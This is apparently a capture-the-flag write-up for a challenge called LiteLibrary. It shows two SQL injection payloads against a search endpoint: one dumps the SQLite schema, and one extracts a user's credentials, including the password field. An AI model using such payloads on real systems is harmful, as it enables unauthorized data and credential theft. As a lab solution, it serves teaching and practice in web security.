# LiteLibrary Solution

The `/api/search?q=query` endpoint seems to be vulnerable to SQL Injection.

We can get list all table names from the `sqlite_master` table. As we can see only one result, we use `group_concat()`:

```
1337' UNION SELECT group_concat(sql), NULL, NULL, NULL, NULL FROM sqlite_master--
```

Get data for the hinted user "madmax":

```
1337' UNION SELECT liteId, liteUsername, gender, liteNick, litePass FROM USERS WHERE liteUsername LIKE 'madmax%25'--
```

`%25` is `%` after URL encoding.
